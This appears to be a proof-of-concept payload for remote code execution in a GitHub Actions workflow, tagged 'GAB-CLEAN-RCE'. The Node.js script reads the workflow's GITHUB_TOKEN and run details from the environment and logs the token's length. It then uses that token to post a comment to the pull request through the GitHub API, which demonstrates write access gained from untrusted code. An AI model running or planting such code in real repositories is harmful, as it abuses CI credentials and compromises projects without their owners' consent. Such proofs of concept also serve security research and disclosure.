const fs = require('fs');
const token = process.env.GITHUB_TOKEN || '';
const repo = process.env.GITHUB_REPOSITORY || '';
let pr = '';
try { pr = fs.readFileSync(process.env.PR_NUMBER_PATH || 'pr-number.txt', 'utf8').trim(); } catch (e) {}
const info = 'GAB-CLEAN-RCE wf=' + process.env.GITHUB_WORKFLOW + ' event=' + process.env.GITHUB_EVENT_NAME + ' run=' + process.env.GITHUB_RUN_ID + ' pr=' + pr + ' token_len=' + token.length;
console.log(info);
(async () => {
  const r = await fetch('https://api.github.com/repos/' + repo + '/issues/' + pr + '/comments', {
    method: 'POST',
    headers: { authorization: 'Bearer ' + token, accept: 'application/vnd.github+json', 'content-type': 'application/json' },
    body: JSON.stringify({ body: info })
  });
  console.log('COMMENT-STATUS ' + r.status);
})().catch(e => console.error('ERR ' + e.message));
